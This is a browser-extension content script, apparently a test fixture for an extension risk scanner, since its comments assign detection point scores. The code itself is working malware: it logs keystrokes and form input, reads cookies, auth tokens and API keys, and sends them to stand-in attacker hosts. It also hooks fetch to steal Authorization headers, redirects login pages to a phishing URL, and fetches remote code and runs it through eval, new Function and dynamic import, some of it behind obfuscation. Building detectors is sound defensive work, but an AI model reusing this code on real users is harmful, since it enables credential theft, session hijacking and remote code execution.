// High risk extension - Content script
// Injected into all URLs with document_start

(function() {
    'use strict';
    
    // Keylogging (HIGH risk)
    document.addEventListener('keydown', (e) => {
        const keyData = {
            key: e.key,
            code: e.code,
            url: window.location.href,
            timestamp: Date.now()
        };
        
        // Send to background
        chrome.runtime.sendMessage({
            type: 'KEYLOG',
            data: keyData
        });
    }, true);
    
    // Track input fields (HIGH risk)
    document.addEventListener('input', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const inputData = {
                value: e.target.value,
                name: e.target.name,
                type: e.target.type,
                url: window.location.href
            };
            
            chrome.runtime.sendMessage({
                type: 'INPUT_CAPTURE',
                data: inputData
            });
        }
    }, true);
    
    // DOM manipulation (HIGH risk)
    function injectMaliciousContent() {
        const maliciousDiv = document.createElement('div');
        maliciousDiv.innerHTML = '<script>console.log("Injected script");</script>';
        document.body.appendChild(maliciousDiv);
    }
    
    // Form field analysis (HIGH risk)
    const forms = document.forms;
    for (let i = 0; i < forms.length; i++) {
        const form = forms[i];
        const inputs = form.querySelectorAll('input, textarea');
        inputs.forEach(input => {
            // Analyze form fields
            console.log('Form field found:', input.name, input.type);
        });
    }
    
    // Access tokens (HIGH risk)
    const authHeaders = {
        'Authorization': 'Bearer ' + getToken(),
        'X-Auth-Token': localStorage.getItem('auth_token')
    };
    
    // ============================================
    // TOKEN/COOKIE THEFT PATTERNS IN CONTENT SCRIPT (CRITICAL)
    // ============================================
    
    // Pattern 1: Cookie theft from document.cookie (40 points - cookie_remote)
    const cookies = document.cookie;
    if (cookies) {
        // Send cookies to remote server via fetch POST (25 points)
        fetch('https://evil-collector.ga/api/steal', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                cookies: cookies,
                url: window.location.href,
                timestamp: Date.now()
            })
        });
        
        // Send via XMLHttpRequest
        const xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://cookie-thief.xyz/api/collect', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({ cookies: cookies }));
        
        // Send via sendBeacon (30 points)
        navigator.sendBeacon('https://cookie-exfil.tk/api/beacon', cookies);
    }
    
    // Pattern 2: Token theft from localStorage (40 points - token_remote)
    const authToken = localStorage.getItem('auth_token');
    const refreshToken = localStorage.getItem('refresh_token');
    const accessToken = localStorage.getItem('access_token');
    const sessionToken = sessionStorage.getItem('session_token');
    const bearerToken = localStorage.getItem('bearer_token');
    const apiKey = localStorage.getItem('api_key');
    
    if (authToken || sessionToken || refreshToken || accessToken || bearerToken || apiKey) {
        // Send tokens to remote server (40 points - token_remote)
        fetch('https://token-exfil.ml/api/steal-tokens', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                auth_token: authToken,
                refresh_token: refreshToken,
                access_token: accessToken,
                session_token: sessionToken,
                bearer_token: bearerToken,
                api_key: apiKey,
                url: window.location.href,
                timestamp: Date.now()
            })
        });
        
        // Also send via XMLHttpRequest
        const xhr2 = new XMLHttpRequest();
        xhr2.open('POST', 'https://token-thief.xyz/api/collect-tokens', true);
        xhr2.setRequestHeader('Content-Type', 'application/json');
        xhr2.send(JSON.stringify({
            auth_token: authToken,
            session_token: sessionToken
        }));
    }
    
    // Pattern 3: Combined cookie + token theft (40 points - cookie_remote + token_remote)
    if (cookies && (authToken || sessionToken || refreshToken)) {
        fetch('https://combined-theft.ga/api/steal-all', {
            method: 'POST',
            body: JSON.stringify({
                cookies: cookies,
                auth_token: authToken,
                session_token: sessionToken,
                refresh_token: refreshToken,
                url: window.location.href,
                timestamp: Date.now()
            })
        });
    }
    
    // Pattern 4: Token theft from Authorization headers (40 points)
    function stealAuthHeaders() {
        // Intercept fetch requests
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            const url = args[0];
            const options = args[1] || {};
            const headers = options.headers || {};
            
            // Check for Authorization header
            if (headers['Authorization'] || headers['authorization']) {
                const token = headers['Authorization'] || headers['authorization'];
                // Exfiltrate token (40 points - token_remote)
                fetch('https://header-thief.xyz/api/steal-header', {
                    method: 'POST',
                    body: JSON.stringify({
                        authorization: token,
                        url: url,
                        timestamp: Date.now()
                    })
                });
            }
            
            return originalFetch.apply(this, args);
        };
    }
    
    // Pattern 5: Keylogging + remote exfiltration (50 points - keylog_remote)
    document.addEventListener('keydown', (e) => {
        const keyData = {
            key: e.key,
            code: e.code,
            url: window.location.href,
            timestamp: Date.now()
        };
        
        // Send keylogged data to remote server (50 points - keylog_remote)
        fetch('https://keylog-exfil.tk/api/collect-keys', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(keyData)
        });
        
        // Also send via sendBeacon
        navigator.sendBeacon('https://keylog-beacon.ga/api/beacon', JSON.stringify(keyData));
    }, true);
    
    // Execute theft patterns
    stealAuthHeaders();
    
    // localStorage access (MEDIUM risk)
    const storedData = localStorage.getItem('user_data');
    if (storedData) {
        chrome.runtime.sendMessage({
            type: 'STORAGE_DATA',
            data: JSON.parse(storedData)
        });
    }
    
    // MutationObserver (MEDIUM risk)
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            console.log('DOM changed:', mutation);
        });
    });
    observer.observe(document.body, {
        childList: true,
        subtree: true
    });
    
    // innerHTML manipulation (MEDIUM risk)
    function modifyPage() {
        const element = document.querySelector('.content');
        if (element) {
            element.innerHTML = '<div>Modified content</div>';
        }
    }
    
    // Redirect hijacking (HIGH risk)
    function hijackRedirect() {
        if (window.location.href.includes('login')) {
            window.location.href = 'https://phishing-site.ml/fake-login';
        }
    }
    
    // Helper functions
    function getToken() {
        // Try multiple sources
        return localStorage.getItem('token') || 
               sessionStorage.getItem('token') ||
               document.cookie.match(/token=([^;]+)/)?.[1];
    }
    
    // Execute on page load
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            injectMaliciousContent();
            modifyPage();
        });
    } else {
        injectMaliciousContent();
        modifyPage();
    }
    
    // Chrome storage sync (MEDIUM risk)
    chrome.storage.sync.get(['user_preferences'], (result) => {
        console.log('User preferences:', result.user_preferences);
    });
    
    // ============================================
    // EVAL() PATTERNS IN CONTENT SCRIPT (CRITICAL)
    // ============================================
    
    // Pattern 1: Direct eval()
    function executeCodeViaEval(code) {
        eval(code);  // CRITICAL: eval()
    }
    
    // Pattern 2: eval() with fetch (RCE Pattern - 40 points)
    function executeRemoteCodeViaEval() {
        fetch('https://malicious-c2.xyz/api/get-payload')
            .then(response => response.text())
            .then(code => {
                eval(code);  // CRITICAL: eval() with remote code
            });
    }
    
    // Pattern 3: eval() with atob
    function executeObfuscatedEval() {
        var encoded = 'ZXZhbCgiY29uc29sZS5sb2coJ0V2YWwgaW4gY29udGVudCBzY3JpcHQnKTsiKQ==';
        var decoded = atob(encoded);
        eval(decoded);  // CRITICAL: eval()
    }
    
    // Pattern 4: eval() in setTimeout
    setTimeout(function() {
        eval('console.log("Eval in setTimeout from content script")');  // CRITICAL: eval()
    }, 1000);
    
    // ============================================
    // NEW FUNCTION() PATTERNS IN CONTENT SCRIPT (CRITICAL)
    // ============================================
    
    // Pattern 1: Direct new Function()
    function executeCodeViaFunction() {
        // Get code from remote server
        fetch('https://evil-server.tk/api/get-code')
            .then(response => response.text())
            .then(code => {
                // Execute using new Function() - RCE Pattern
                const fn = new Function(code);
                fn();
            });
    }
    
    // Pattern 2: new Function() with atob
    function executeObfuscatedFunction() {
        var encoded = 'cmV0dXJuIGNvbnNvbGUubG9nKCdOZXcgRnVuY3Rpb24gaW4gY29udGVudCBzY3JpcHQnKTs=';
        var decoded = atob(encoded);
        var fn = new Function(decoded);
        fn();
    }
    
    // Pattern 3: new Function() with multiple parameters
    function createFunctionWithParams() {
        var code = 'return console.log("New Function with params in content script")';
        var fn = new Function('a', 'b', 'c', code);
        fn(1, 2, 3);
    }
    
    // ============================================
    // REMOTE SCRIPT LOADING PATTERNS (CRITICAL - Multiple instances)
    // ============================================
    
    // Pattern 1: Basic remote script loading
    function loadMaliciousScript() {
        const script = document.createElement('script');
        script.src = 'https://malicious-cdn.xyz/scripts/exploit.js';  // Remote script loading
        document.head.appendChild(script);
    }
    
    // Pattern 2: Remote script with onload
    function loadRemoteScriptWithCallback() {
        const script = document.createElement('script');
        script.src = 'https://evil-c2.ml/scripts/payload.js';
        script.onload = function() {
            eval('console.log("Remote script loaded")');  // CRITICAL: eval()
        };
        document.head.appendChild(script);
    }
    
    // Pattern 3: Remote script via dynamic import (CRITICAL - 40 points)
    async function loadRemoteModule() {
        try {
            const module = await import('https://malicious-api.xyz/modules/exploit.js');  // CRITICAL: dynamic import
            module.default();
        } catch (e) {
            console.error('Import error:', e);
        }
    }
    
    // Pattern 4: Remote script via fetch + eval
    function loadRemoteScriptViaFetch() {
        fetch('https://malicious-cdn.xyz/scripts/code.js')
            .then(response => response.text())
            .then(code => {
                eval(code);  // CRITICAL: eval() with remote code
            });
    }
    
    // Pattern 5: Remote script via fetch + new Function
    function loadRemoteScriptViaFetchFunction() {
        fetch('https://evil-server.tk/api/get-code')
            .then(response => response.text())
            .then(code => {
                const fn = new Function(code);  // CRITICAL: new Function() with remote code
                fn();
            });
    }
    
    // Pattern 6: Remote script via XMLHttpRequest
    function loadRemoteScriptViaXHR() {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://malicious-c2.xyz/scripts/payload.js', true);
        xhr.onload = function() {
            eval(xhr.responseText);  // CRITICAL: eval() with remote code
        };
        xhr.send();
    }
    
    // ============================================
    // HIGHLY OBFUSCATED CODE IN CONTENT SCRIPT
    // ============================================
    
    // Pattern 1: _0x prefix obfuscation
    var _0xABCD = ['eval', 'Function', 'atob', 'fetch'];
    var _0xEFGH = function(_0x1234) {
        return _0xABCD[_0x1234];
    };
    
    // Pattern 2: Hex obfuscation
    var hexCode = '\x65\x76\x61\x6c\x28\x27\x63\x6f\x6e\x73\x6f\x6c\x65\x2e\x6c\x6f\x67\x28\x22\x48\x65\x78\x20\x6f\x62\x66\x75\x73\x63\x61\x74\x69\x6f\x6e\x22\x29\x27\x29';
    try {
        eval(hexCode);  // CRITICAL: eval()
    } catch (e) {}
    
    // Pattern 3: Unicode escapes
    var unicodeCode = '\u0065\u0076\u0061\u006c\u0028\u0027\u0063\u006f\u006e\u0073\u006f\u006c\u0065\u002e\u006c\u006f\u0067\u0028\u0022\u0055\u006e\u0069\u0063\u006f\u0064\u0065\u0022\u0029\u0027\u0029';
    try {
        eval(unicodeCode);  // CRITICAL: eval()
    } catch (e) {}
    
    // Pattern 4: Multi-layer Base64 (>300 chars)
    var largeBase64 = 'SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBsb25nIGJhc2U2NCBlbmNvZGVkIHN0cmluZyB0aGF0IGlzIG1vcmUgdGhhbiAzMDAgY2hhcmFjdGVycyBsb25nLiBJdCBjb250YWlucyBzb21lIG9iZnVzY2F0ZWQgY29kZSB0aGF0IHdpbGwgYmUgZGVjb2RlZCBhbmQgZXhlY3V0ZWQuIFRoaXMgaXMgYSB0ZXN0IHBheWxvYWQgdG8gZGVtb25zdHJhdGUgdGhlIGRldGVjdGlvbiBvZiBsb25nIGJhc2U2NCBzdHJpbmdzIGluIG1hbGljaW91cyBleHRlbnNpb25zLiBUaGUgc3RyaW5nIGlzIGRlc2lnbmVkIHRvIGJlIG1vcmUgdGhhbiAzMDAgY2hhcmFjdGVycyB0byB0cmlnZ2VyIHRoZSBkZXRlY3Rpb24gcGF0dGVybi4gSXQgaW5jbHVkZXMgbXVsdGlwbGUgc2VudGVuY2VzIGFuZCB3b3JkcyB0byByZWFjaCB0aGUgcmVxdWlyZWQgbGVuZ3RoLiBUaGlzIGlzIGEgdGVzdCBwYXlsb2FkIGZvciBkZW1vbnN0cmF0aW5nIHRoZSBkZXRlY3Rpb24gb2YgbG9uZyBiYXNlNjQgZW5jb2RlZCBzdHJpbmdzIGluIG1hbGljaW91cyBleHRlbnNpb25zLg==';
    try {
        var decoded1 = atob(largeBase64);
        var decoded2 = atob(decoded1);
        var decoded3 = atob(decoded2);
        eval(decoded1);  // CRITICAL: eval() with multi-layer decoded code
    } catch (e) {}
    
    // Pattern 5: IIFE unpack
    (function(_0x1234, _0x5678) {
        var _0xabcd = function(_0xefgh) {
            return String.fromCharCode(_0xefgh);
        };
        var _0xijkl = _0xabcd(0x65) + _0xabcd(0x76) + _0xabcd(0x61) + _0xabcd(0x6c);
        window[_0xijkl]('console.log("IIFE unpack in content script")');
    })(window, document);
    
    // Pattern 6: String concatenation obfuscation
    var str1 = 'ev';
    var str2 = 'al';
    var evalStr = str1 + str2;
    window[evalStr]('console.log("String concat obfuscation")');
    
    // Pattern 7: High entropy XOR obfuscation
    var _0xXOR = function(_0xdata) {
        var _0xresult = '';
        for (var i = 0; i < _0xdata.length; i++) {
            _0xresult += String.fromCharCode(_0xdata.charCodeAt(i) ^ 0x42);
        }
        return _0xresult;
    };
    var obfuscated = _0xXOR('eval("console.log(\'XOR obfuscation in content\')")');
    eval(obfuscated);
    
    // Execute all patterns
    executeRemoteCodeViaEval();
    executeObfuscatedEval();
    executeCodeViaFunction();
    executeObfuscatedFunction();
    createFunctionWithParams();
    loadMaliciousScript();
    loadRemoteScriptWithCallback();
    loadRemoteModule();
    loadRemoteScriptViaFetch();
    loadRemoteScriptViaFetchFunction();
    loadRemoteScriptViaXHR();
    
})();

